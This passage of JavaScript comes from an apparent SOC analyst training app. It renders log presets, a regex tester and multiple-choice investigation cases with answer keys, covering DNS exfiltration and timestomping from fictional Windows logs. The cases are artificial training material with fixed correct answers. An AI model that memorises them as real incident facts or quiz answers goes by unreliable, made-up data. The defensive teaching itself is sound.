          explanation: "Base64 decoding `Q0NfREVUQUlMU180MTEyXzk4MDFfMTIyMw` yields `CC_DETAILS_4112_9801_1223`."
        },
        {
          id: "q3",
          question: "What immediate containment action should the SOC take on the internal network?",
          options: [
            "Reboot the DNS server",
            "Sinkhole domain `darktunnel-c2.net` and isolate workstation `10.0.10.45` via EDR",
            "Disable DNS logging to save disk space",
            "Allow traffic for 24 hours to observe attacker motives"
          ],
          correct: 1,
          explanation: "Sinkholing the malicious C2 domain severs communication, while isolating the infected host halts active exfiltration."
        }
      ]
    },
    {
      id: "case-5",
      title: "Case 5: Timestomping & Audit Policy Tampering",
      difficulty: "Medium",
      badge: "Anti-Forensics",
      scenario: `The SOC correlation engine generated an alert for 'Suspicious Audit Policy Deactivation and Time Manipulation'. Inspect the Windows Security events below to identify the techniques used by the attacker to evade detection.`,
      rawLogs: `2026-09-30 07:00:10 WIN-SRV-AD01 Security-Auditing 4719: System audit policy was changed. SubjectUserSid: S-1-5-21-391-500 SubjectUserName: Administrator SubjectDomainName: CORP AuditPolicyChanges: Success and Failure auditing disabled for 'Object Access', 'Privilege Use', and 'Detailed Tracking'.
2026-09-30 07:00:15 WIN-SRV-AD01 Security-Auditing 4616: The system time was changed. SubjectUserName: Administrator ProcessName: C:\\Windows\\System32\\cmd.exe Previous Time: 2026-09-30 07:00:15.000 New Time: 2023-01-01 00:00:00.000
2026-09-30 07:00:20 WIN-SRV-AD01 Microsoft-Windows-Sysmon 2: A process changed a file creation time. Image: C:\\Windows\\System32\\cmd.exe TargetFilename: C:\\Windows\\System32\\drivers\\malware.sys CreationUtcTime: 2019-12-07 10:00:00.000 PreviousCreationUtcTime: 2026-09-30 07:00:18.000`,
      questions: [
        {
          id: "q1",
          question: "What was the malicious purpose of Event ID 4719 in this sequence?",
          options: [
            "To grant user Administrator a new Kerberos ticket",
            "To disable audit logging for Object Access and Privilege Use to blind the SIEM",
            "To install a new graphics driver",
            "To lock out user accounts"
          ],
          correct: 1,
          explanation: "Event 4719 indicates system audit policy modification. Disabling logging blinds security monitoring tools."
        },
        {
          id: "q2",
          question: "What defense evasion technique is evidenced by Event ID 4616 and Sysmon Event 2?",
          options: [
            "Pass-the-Hash",
            "Timestomping (modifying system time and file creation timestamps to anti-forensically hide malware)",
            "DLL Sideloading",
            "Kerberoasting"
          ],
          correct: 1,
          explanation: "Event 4616 (system clock change) and Sysmon Event 2 (file creation time changed from 2026 to 2019) are classic signatures of Timestomping (MITRE T1070.006)."
        },
        {
          id: "q3",
          question: "How should a mature SOC protect log integrity against such clock tampering and log erasure?",
          options: [
            "Rely only on local workstation logs",
            "Implement real-time central SIEM forwarding, NTP Stratum-1 time synchronization, and WORM storage",
            "Disable Sysmon",
            "Allow administrators full discretion to clear logs"
          ],
          correct: 1,
          explanation: "Real-time streaming to central SIEM, NTP synchronization, and Write-Once-Read-Many (WORM) storage ensure logs cannot be altered retroactively."
        }
      ]
    }
  ],

  init() {
    this.bindEvents();
    this.render();
  },

  bindEvents() {
    // Sub-tab buttons
    const subTabBtns = document.querySelectorAll('.log-subtab-btn');
    subTabBtns.forEach(btn => {
      btn.addEventListener('click', () => {
        const subTab = btn.getAttribute('data-subtab');
        this.switchSubTab(subTab);
      });
    });

    // Preset log selector
    const presetSelect = document.getElementById('log-preset-select');
    if (presetSelect) {
      presetSelect.addEventListener('change', (e) => {
        const selectedId = e.target.value;
        this.loadPreset(selectedId);
      });
    }

    // Decode Custom Log button
    const parseBtn = document.getElementById('log-decode-btn');
    if (parseBtn) {
      parseBtn.addEventListener('click', () => {
        const textarea = document.getElementById('log-raw-input');
        if (textarea) {
          this.parseAndDisplayCustomLog(textarea.value);
        }
      });
    }

    // Reset log button
    const resetBtn = document.getElementById('log-reset-btn');
    if (resetBtn) {
      resetBtn.addEventListener('click', () => {
        if (presetSelect) {
          presetSelect.value = this.logPresets[0].id;
          this.loadPreset(this.logPresets[0].id);
        }
      });
    }

    // Regex preset selector
    const regexSelect = document.getElementById('regex-preset-select');
    if (regexSelect) {
      regexSelect.addEventListener('change', (e) => {
        const index = parseInt(e.target.value, 10);
        this.loadRegexPreset(index);
      });
    }

    // Regex test inputs
    const regexPatternInput = document.getElementById('regex-pattern-input');
    const regexTestArea = document.getElementById('regex-test-area');
    if (regexPatternInput && regexTestArea) {
      const updateRegexMatches = () => {
        this.evaluateRegex(regexPatternInput.value, regexTestArea.value);
      };
      regexPatternInput.addEventListener('input', updateRegexMatches);
      regexTestArea.addEventListener('input', updateRegexMatches);
    }

    // Library category buttons
    const libCatBtns = document.querySelectorAll('.log-lib-cat-btn');
    libCatBtns.forEach(btn => {
      btn.addEventListener('click', () => {
        libCatBtns.forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        this.activeLibCategory = btn.getAttribute('data-libcat');
        this.renderKnowledgeLibrary();
      });
    });

    // Library search input
    const libSearchInput = document.getElementById('log-lib-search');
    if (libSearchInput) {
      libSearchInput.addEventListener('input', (e) => {
        this.libSearchQuery = e.target.value.toLowerCase().trim();
        this.renderKnowledgeLibrary();
      });
    }
  },

  render() {
    this.populatePresetDropdown();
    this.loadPreset(this.logPresets[0].id);
    this.populateRegexDropdown();
    this.loadRegexPreset(0);
    this.renderKnowledgeLibrary();
    this.renderInvestigationCases();
  },

  switchSubTab(subTabId) {
    this.currentSubTab = subTabId;
    document.querySelectorAll('.log-subtab-btn').forEach(btn => {
      btn.classList.toggle('active', btn.getAttribute('data-subtab') === subTabId);
    });
    document.querySelectorAll('.log-subtab-view').forEach(view => {
      view.classList.toggle('active', view.id === `log-view-${subTabId}`);
    });
  },

  populatePresetDropdown() {
    const select = document.getElementById('log-preset-select');
    if (!select) return;
    select.innerHTML = '';
    this.logPresets.forEach(preset => {
      const opt = document.createElement('option');
      opt.value = preset.id;
      opt.textContent = `[${preset.category}] ${preset.name}`;
      select.appendChild(opt);
    });
  },

  loadPreset(presetId) {
    const preset = this.logPresets.find(p => p.id === presetId) || this.logPresets[0];
    const rawInput = document.getElementById('log-raw-input');
    if (rawInput) rawInput.value = preset.raw;
    this.displayParsedAnalysis(preset.parsed, preset.raw);
  },

  parseAndDisplayCustomLog(rawText) {
    if (!rawText.trim()) return;

    // Check if raw matches any known preset
    const foundPreset = this.logPresets.find(p => rawText.includes(p.parsed.eventId) || rawText.includes(p.parsed.sourceIp));
    if (foundPreset) {
      this.displayParsedAnalysis(foundPreset.parsed, rawText);
      return;
    }

    // Generic heuristic parser
    const isWindows = /EventID=(\d+)/i.test(rawText) || /Event ID/i.test(rawText);
    const isIIS = /cs-method|W3SVC|GET|POST/i.test(rawText) && /\d{3}\s+\d+\s+\d+/i.test(rawText);
    const isSyslog = /sshd|sudo|kernel|audit/i.test(rawText);

    const eventIdMatch = rawText.match(/(?:EventID|Event ID)[=:\s]+(\d+)/i);
    const ipMatch = rawText.match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/);
    const userMatch = rawText.match(/(?:AccountName|TargetUserName|user|SubjectUserName)[=:\s]+["']?([\w\.-]+)["']?/i);

    const parsed = {
      timestamp: new Date().toISOString().replace('T', ' ').substring(0, 19),
      source: isWindows ? "Microsoft Windows Event Log" : isIIS ? "Microsoft IIS W3C Web Log" : isSyslog ? "Linux Syslog Daemon" : "Custom Telemetry Stream",
      eventId: eventIdMatch ? `Event ID ${eventIdMatch[1]}` : (isIIS ? "W3C HTTP Request" : "System Log Entry"),
      computer: "Host / Endpoint",
      user: userMatch ? userMatch[1] : "SYSTEM / Anonymous",
      domain: "CORP / Local",
      logonType: isWindows ? "Parsed from Security Descriptor" : "Network Stream",
      sourceIp: ipMatch ? ipMatch[0] : "Internal",
      sourcePort: "Parsed from L4 Header",
      subStatus: "Extracted from event stream",
      severity: /fail|error|denied|attack|injection|clear|4625|1102/i.test(rawText) ? "High" : "Informational",
      threat: "Custom Parsed Telemetry Entry",
      mitre: "Telemetry Analysis & Log Ingestion",
      triage: "Custom log parsed successfully. Review extracted fields below to cross-reference with SIEM correlation rules and Threat Intelligence indicators.",
      recommendations: [
        "Correlate source IP with threat intelligence feeds (STIX/TAXII).",
        "Inspect parent/child process execution in EDR.",
        "Verify authentication logs for anomalous credential activity."
      ]
    };

    this.displayParsedAnalysis(parsed, rawText);
  },

  displayParsedAnalysis(parsed, rawText) {
    const analysisCard = document.getElementById('log-analysis-results');
    if (!analysisCard) return;

    // Syntax highlight raw text for display
    let highlightedRaw = rawText
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/(EventID=\d+|Event ID \d+)/gi, '<span style="color: #38bdf8; font-weight: bold;">$1</span>')
      .replace(/(\b(?:\d{1,3}\.){3}\d{1,3}\b)/g, '<span style="color: #f59e0b; font-weight: bold;">$1</span>')
      .replace(/(LogonType=\d+)/gi, '<span style="color: #a855f7; font-weight: bold;">$1</span>')
      .replace(/(sc-status=\d+|\b200\b|\b404\b|\b500\b)/gi, '<span style="color: #10b981; font-weight: bold;">$1</span>')
      .replace(/(SubStatus="0x[A-Fa-f0-9]+"|0xC000006A|0xC0000064)/gi, '<span style="color: #f43f5e; font-weight: bold;">$1</span>');

    const severityBadgeClass = parsed.severity === 'Critical' ? 'badge-rose' : parsed.severity === 'High' ? 'badge-amber' : 'badge-cyan';

    analysisCard.innerHTML = `
      <!-- Top Diagnostic Summary -->
      <div style="background: rgba(15, 23, 42, 0.6); border: 1px solid var(--border-color); border-radius: var(--radius-md); padding: 1.25rem; margin-bottom: 1.25rem;">
        <div style="display: flex; justify-content: space-between; align-items: flex-start; gap: 1rem; flex-wrap: wrap; margin-bottom: 0.75rem;">
          <div>
            <span class="badge ${severityBadgeClass}" style="margin-bottom: 0.35rem;">Severity: ${parsed.severity}</span>
            <h3 style="font-size: 1.2rem; font-weight: 700; color: #fff;">${parsed.threat}</h3>
          </div>
          <span class="badge badge-purple">${parsed.source}</span>
        </div>
        <p style="font-size: 0.9rem; color: var(--text-muted); line-height: 1.5;">${parsed.triage}</p>
        <div style="margin-top: 0.75rem; display: flex; align-items: center; gap: 0.5rem; font-size: 0.85rem;">
          <span style="color: var(--accent-cyan); font-weight: 600;">🏷️ MITRE ATT&CK:</span>
          <span style="background: rgba(6, 182, 212, 0.15); color: #38bdf8; padding: 0.2rem 0.5rem; border-radius: 4px; font-family: var(--font-mono);">${parsed.mitre}</span>
        </div>
      </div>

      <!-- Raw Log Terminal Display -->
      <div style="margin-bottom: 1.25rem;">
        <div style="font-size: 0.85rem; font-weight: 600; color: var(--text-muted); margin-bottom: 0.4rem; display: flex; justify-content: space-between;">
          <span>🖥️ Raw Telemetry Stream (Colorized Syntax):</span>
          <span>EVTX / Syslog / W3C</span>
        </div>
        <div class="log-terminal-view" style="background: #090d16; border: 1px solid rgba(56, 189, 248, 0.2); border-radius: var(--radius-md); padding: 1rem; font-family: var(--font-mono); font-size: 0.82rem; line-height: 1.7; overflow-x: auto; color: #e2e8f0; white-space: pre-wrap;">${highlightedRaw}</div>
      </div>

      <!-- Key-Value Field Breakdown Table -->
      <div style="margin-bottom: 1.25rem;">
        <h4 style="font-size: 1rem; font-weight: 700; margin-bottom: 0.75rem; color: #fff;">📊 Parsed Field Taxonomy & Extracted Artifacts</h4>
        <div class="table-responsive">
          <table class="data-table">
            <thead>
              <tr>
                <th style="width: 25%;">Standard Field</th>
                <th style="width: 35%;">Extracted Value</th>
                <th style="width: 40%;">SOC Forensic Meaning</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td><strong style="color: var(--accent-cyan);">Event Identifier / Code</strong></td>
                <td><code style="color: #38bdf8;">${parsed.eventId}</code></td>
                <td>Audit condition code generated by the logging subsystem.</td>
              </tr>
              <tr>
                <td><strong style="color: var(--accent-cyan);">Timestamp (UTC/Local)</strong></td>
                <td>${parsed.timestamp}</td>
                <td>Event creation time; essential for timeline sequencing and timestomping detection.</td>
              </tr>
              <tr>
                <td><strong style="color: var(--accent-cyan);">Target / Subject User</strong></td>
                <td><code style="color: #10b981;">${parsed.user}</code> (Domain: ${parsed.domain})</td>
                <td>Identity context; used to assess account takeover and privilege level.</td>
              </tr>
              <tr>
                <td><strong style="color: var(--accent-cyan);">Source IP & Port</strong></td>
                <td><code style="color: #f59e0b;">${parsed.sourceIp}</code> : ${parsed.sourcePort}</td>
                <td>Originating endpoint / attacker address for firewall containment.</td>
              </tr>
              <tr>
                <td><strong style="color: var(--accent-cyan);">Logon Type / Channel</strong></td>
                <td>${parsed.logonType}</td>
                <td>Indicates local console (Type 2), remote network SMB (Type 3), or RDP (Type 10).</td>
              </tr>
              <tr>
                <td><strong style="color: var(--accent-cyan);">Sub-Status / Error Code</strong></td>
                <td><code style="color: #f43f5e;">${parsed.subStatus}</code></td>
                <td>Exact reason for failure (wrong password, account locked, non-existent user).</td>
              </tr>
            </tbody>
          </table>
        </div>
      </div>

      <!-- Recommended SOC Containment Actions -->
      <div style="background: rgba(16, 185, 129, 0.08); border: 1px solid rgba(16, 185, 129, 0.25); border-radius: var(--radius-md); padding: 1.25rem;">
        <h4 style="font-size: 1rem; font-weight: 700; color: var(--accent-emerald); margin-bottom: 0.5rem; display: flex; align-items: center; gap: 0.5rem;">
          🛡️ Prescribed SOC Response Playbook Steps:
        </h4>
        <ul style="padding-left: 1.25rem; font-size: 0.88rem; color: var(--text-main); line-height: 1.7;">
          ${parsed.recommendations.map(rec => `<li>${rec}</li>`).join('')}
        </ul>
      </div>
    `;
  },

  populateRegexDropdown() {
    const select = document.getElementById('regex-preset-select');
    if (!select) return;
    select.innerHTML = '';
    this.regexPresets.forEach((preset, idx) => {
      const opt = document.createElement('option');
      opt.value = idx;
      opt.textContent = preset.name;
      select.appendChild(opt);
    });
  },

  loadRegexPreset(index) {
    const preset = this.regexPresets[index] || this.regexPresets[0];
    const patternInput = document.getElementById('regex-pattern-input');
    const testArea = document.getElementById('regex-test-area');
    const explBox = document.getElementById('regex-explanation-box');

    if (patternInput) patternInput.value = preset.pattern;
    if (testArea) testArea.value = preset.sample;
    if (explBox) explBox.textContent = preset.explanation;

    this.evaluateRegex(preset.pattern, preset.sample);
  },

  evaluateRegex(patternStr, testStr) {
    const matchCountBadge = document.getElementById('regex-match-count');
    const displayContainer = document.getElementById('regex-highlight-display');
    if (!displayContainer) return;

    if (!patternStr || !testStr) {
      displayContainer.textContent = testStr || "Enter text to evaluate regex matches...";
      if (matchCountBadge) matchCountBadge.textContent = "0 matches";
      return;
    }

    try {
      // Clean leading and trailing slashes/flags if user enters /pattern/flags
      let cleanPattern = patternStr;
      let flags = 'gi';

      if (patternStr.startsWith('/') && patternStr.lastIndexOf('/') > 0) {
        cleanPattern = patternStr.substring(1, patternStr.lastIndexOf('/'));
        flags = patternStr.substring(patternStr.lastIndexOf('/') + 1) || 'gi';
        if (!flags.includes('g')) flags += 'g';
      }

      const regex = new RegExp(cleanPattern, flags);
      const matches = testStr.match(regex);
      const count = matches ? matches.length : 0;

      if (matchCountBadge) {
        matchCountBadge.textContent = `${count} ${count === 1 ? 'match' : 'matches'}`;
        matchCountBadge.className = count > 0 ? "badge badge-emerald" : "badge badge-rose";
      }

      // Safe escape HTML
      const escaped = testStr
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');

      // Highlight occurrences
      const highlighted = escaped.replace(regex, (match) => `<mark style="background: rgba(245, 158, 11, 0.35); color: #fbbf24; border-bottom: 2px solid #f59e0b; padding: 2px 4px; border-radius: 3px; font-weight: bold;">${match}</mark>`);
      displayContainer.innerHTML = highlighted;

    } catch (err) {
      if (matchCountBadge) {
        matchCountBadge.textContent = "Invalid Regex";
        matchCountBadge.className = "badge badge-rose";
      }
      displayContainer.innerHTML = `<span style="color: #f43f5e;">Regex Error: ${err.message}</span>`;
    }
  },

  renderKnowledgeLibrary() {
    const container = document.getElementById('log-lib-content-area');
    if (!container) return;

    const exam = StorageManager.getCurrentExam();
    const allNotes = StorageManager.getNotes(exam.id);

    // Filter notes matching log categories
    const logCategories = {
      windows: ["Windows Event Logs", "Endpoint & Sysmon Logs"],
      linux: ["Linux & Syslog Logs", "Linux & Network Logs"],
      web: ["Web Server & App Logs", "Web Security & Detection"],
      network: ["Network & Security Logs"],
      database: ["Database & Cloud Logs", "Cloud SOC & Technologies"],
      siem: ["SIEM & Log Pipeline", "Defensive Frameworks"]
    };

    const targetCats = logCategories[this.activeLibCategory] || logCategories.windows;
    let filteredNotes = allNotes.filter(n => targetCats.includes(n.category));

    if (this.libSearchQuery) {
      filteredNotes = allNotes.filter(n => {
        const titleMatch = n.title.toLowerCase().includes(this.libSearchQuery);
        const descMatch = n.description.toLowerCase().includes(this.libSearchQuery);
        const contentMatch = JSON.stringify(n).toLowerCase().includes(this.libSearchQuery);
        return titleMatch || descMatch || contentMatch;
      });
    }

    if (filteredNotes.length === 0) {
      container.innerHTML = `
        <div class="empty-state">
          <p>No cheat sheets found for this category or search filter.</p>
        </div>
      `;
      return;
    }

    container.innerHTML = '';
    filteredNotes.forEach(note => {
      const card = document.createElement('div');
      card.className = 'card';
      card.style.marginBottom = '1.5rem';

      let bodyHTML = '';
      if (note.type === 'table') {
        const headerCols = note.headers.map(h => `<th>${h}</th>`).join('');
        const rowHTML = note.rows.map(row => {
          const cells = row.map((cell, idx) => {
            if (idx === 0) return `<td><strong style="color: var(--accent-cyan); font-family: var(--font-mono);">${cell}</strong></td>`;
            if (cell === 'Critical') return `<td><span class="badge badge-rose">Critical</span></td>`;
            if (cell === 'High') return `<td><span class="badge badge-amber">High</span></td>`;
            if (cell === 'Medium') return `<td><span class="badge badge-purple">Medium</span></td>`;
            if (cell === 'Informational') return `<td><span class="badge badge-cyan">Info</span></td>`;
            return `<td>${cell}</td>`;
          }).join('');
          return `<tr>${cells}</tr>`;
        }).join('');

        bodyHTML = `
          <div class="table-responsive">
            <table class="data-table">
              <thead><tr>${headerCols}</tr></thead>
              <tbody>${rowHTML}</tbody>
            </table>
          </div>
        `;
      } else if (note.type === 'cards') {
        const itemsHTML = note.items.map(item => `
          <div style="background: var(--bg-tertiary); border: 1px solid var(--border-color); border-radius: var(--radius-md); padding: 1rem;">
            <div style="font-size: 0.95rem; font-weight: 700; color: #fff; margin-bottom: 0.35rem;">${item.title}</div>
            <div style="font-family: var(--font-mono); font-size: 0.8rem; color: var(--accent-cyan); margin-bottom: 0.5rem; background: rgba(6, 182, 212, 0.1); padding: 0.35rem 0.6rem; border-radius: 4px; word-break: break-all;">
              ${item.code}
            </div>
            <p style="font-size: 0.85rem; color: var(--text-muted); line-height: 1.5;">${item.desc}</p>
          </div>
        `).join('');

        bodyHTML = `<div class="grid-2" style="gap: 1rem;">${itemsHTML}</div>`;
      }

      card.innerHTML = `
        <div style="display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 0.75rem; flex-wrap: wrap; gap: 0.5rem;">
          <div>
            <span class="badge badge-cyan" style="margin-bottom: 0.35rem;">${note.category}</span>
            <h3 style="font-size: 1.2rem; font-weight: 700; color: #fff;">${note.title}</h3>
          </div>
        </div>
        <p style="color: var(--text-muted); font-size: 0.9rem; margin-bottom: 1.25rem;">${note.description}</p>
        ${bodyHTML}
      `;
      container.appendChild(card);
    });
  },

  renderInvestigationCases() {
    const tabsContainer = document.getElementById('case-tabs-container');
    const caseDisplay = document.getElementById('case-display-container');
    if (!tabsContainer || !caseDisplay) return;

    tabsContainer.innerHTML = '';
    this.investigationCases.forEach((c, idx) => {
      const btn = document.createElement('button');
      btn.className = `mindmap-tab-btn ${this.activeCaseIndex === idx ? 'active' : ''}`;
      btn.innerHTML = `
        <span>${c.title}</span>
        <span class="badge ${this.activeCaseIndex === idx ? 'badge-cyan' : 'badge-purple'}">${c.badge}</span>
      `;
      btn.addEventListener('click', () => {
        this.activeCaseIndex = idx;
        this.renderInvestigationCases();
      });
      tabsContainer.appendChild(btn);
    });

    const activeCase = this.investigationCases[this.activeCaseIndex];
    if (!activeCase) return;

    // Syntax highlight logs
    let highlightedCaseLogs = activeCase.rawLogs
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/(\b(?:\d{1,3}\.){3}\d{1,3}\b)/g, '<span style="color: #f59e0b; font-weight: bold;">$1</span>')
      .replace(/(4624|4625|4672|7045|4776|4719|4616|1102)/g, '<span style="color: #38bdf8; font-weight: bold;">$1</span>')
      .replace(/(LogonType:\s*\d+|LogonType=\d+)/gi, '<span style="color: #a855f7; font-weight: bold;">$1</span>');

    const questionsHTML = activeCase.questions.map((q, qIdx) => `
      <div class="question-card" style="margin-bottom: 1.25rem; background: var(--bg-tertiary);" id="case-qcard-${q.id}">
        <div style="font-size: 0.95rem; font-weight: 700; color: #fff; margin-bottom: 0.75rem;">
          Question ${qIdx + 1}: ${q.question}
        </div>
        <div class="options-list" style="gap: 0.5rem;">
          ${q.options.map((opt, optIdx) => `
            <div class="option-item" data-case-qid="${q.id}" data-opt-idx="${optIdx}" style="padding: 0.75rem 1rem; font-size: 0.88rem;">
              <span style="font-weight: 600; margin-right: 0.5rem; color: var(--accent-cyan);">${String.fromCharCode(65 + optIdx)}.</span>
              ${opt}
            </div>
          `).join('')}
        </div>
        <div class="explanation-box" id="case-expl-${q.id}" style="display: none; margin-top: 0.75rem;">
          <div style="font-weight: 700; color: var(--accent-emerald); margin-bottom: 0.25rem;">💡 SOC Instructor Debrief:</div>
          <div style="font-size: 0.85rem; color: var(--text-main);">${q.explanation}</div>
        </div>
      </div>
    `).join('');

    caseDisplay.innerHTML = `
      <div class="card" style="margin-bottom: 1.5rem;">
        <div style="display: flex; justify-content: space-between; align-items: flex-start; gap: 1rem; flex-wrap: wrap; margin-bottom: 0.75rem;">
          <div>
            <span class="badge badge-amber" style="margin-bottom: 0.35rem;">Difficulty: ${activeCase.difficulty}</span>
            <h3 style="font-size: 1.3rem; font-weight: 800; color: #fff;">${activeCase.title}</h3>
          </div>
          <span class="badge badge-cyan">${activeCase.badge}</span>
        </div>

        <p style="color: var(--text-main); font-size: 0.92rem; line-height: 1.6; margin-bottom: 1.25rem; background: rgba(6, 182, 212, 0.08); border-left: 3px solid var(--accent-cyan); padding: 0.85rem 1rem; border-radius: var(--radius-sm);">
          <strong>🎯 Scenario Briefing:</strong> ${activeCase.scenario}
        </p>

        <div style="margin-bottom: 1.5rem;">
          <div style="font-size: 0.85rem; font-weight: 600; color: var(--text-muted); margin-bottom: 0.4rem;">
            🖥️ Evidence Log Dump (Forensic Acquisition):
          </div>
          <div class="log-terminal-view" style="background: #080c14; border: 1px solid var(--border-color); border-radius: var(--radius-md); padding: 1rem; font-family: var(--font-mono); font-size: 0.82rem; line-height: 1.6; color: #e2e8f0; overflow-x: auto; white-space: pre-wrap;">${highlightedCaseLogs}</div>
        </div>

        <h4 style="font-size: 1.1rem; font-weight: 700; color: #fff; margin-bottom: 1rem;">
          📝 Investigative Analysis Questions (${activeCase.questions.length} Questions)
        </h4>

        <div id="case-questions-container">
          ${questionsHTML}
        </div>

        <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 1.5rem; flex-wrap: wrap; gap: 1rem;">
          <button id="case-validate-btn" class="btn btn-primary">
            🔍 Submit Forensic Assessment
          </button>
          <div id="case-score-feedback" style="font-size: 0.9rem; font-weight: 600; color: var(--accent-emerald);"></div>
        </div>
      </div>
    `;

    // Bind option click events
    activeCase.questions.forEach(q => {
      const optionItems = caseDisplay.querySelectorAll(`[data-case-qid="${q.id}"]`);
      optionItems.forEach(item => {
        item.addEventListener('click', () => {
          optionItems.forEach(i => i.classList.remove('selected'));
          item.classList.add('selected');
        });
      });
    });

    // Bind validate button
    const validateBtn = document.getElementById('case-validate-btn');
    if (validateBtn) {
      validateBtn.addEventListener('click', () => {
        let correctCount = 0;
        activeCase.questions.forEach(q => {
          const selectedItem = caseDisplay.querySelector(`[data-case-qid="${q.id}"].selected`);
          const explBox = document.getElementById(`case-expl-${q.id}`);
          const optionItems = caseDisplay.querySelectorAll(`[data-case-qid="${q.id}"]`);

          if (explBox) explBox.style.display = 'block';

          if (selectedItem) {
            const selectedIdx = parseInt(selectedItem.getAttribute('data-opt-idx'), 10);
            if (selectedIdx === q.correct) {
              correctCount++;
              selectedItem.classList.add('correct');
            } else {
              selectedItem.classList.add('incorrect');
              // Highlight true correct
              optionItems[q.correct].classList.add('correct');
            }
          } else {
            // Highlight correct answer if unanswered
            optionItems[q.correct].classList.add('correct');
          }
        });

        const feedback = document.getElementById('case-score-feedback');
        if (feedback) {
          const percentage = Math.round((correctCount / activeCase.questions.length) * 100);
          feedback.innerHTML = `🏁 Assessment Score: <strong>${correctCount}/${activeCase.questions.length} (${percentage}%)</strong> - Detailed debriefs revealed above!`;
        }
      });
    }
  }
};
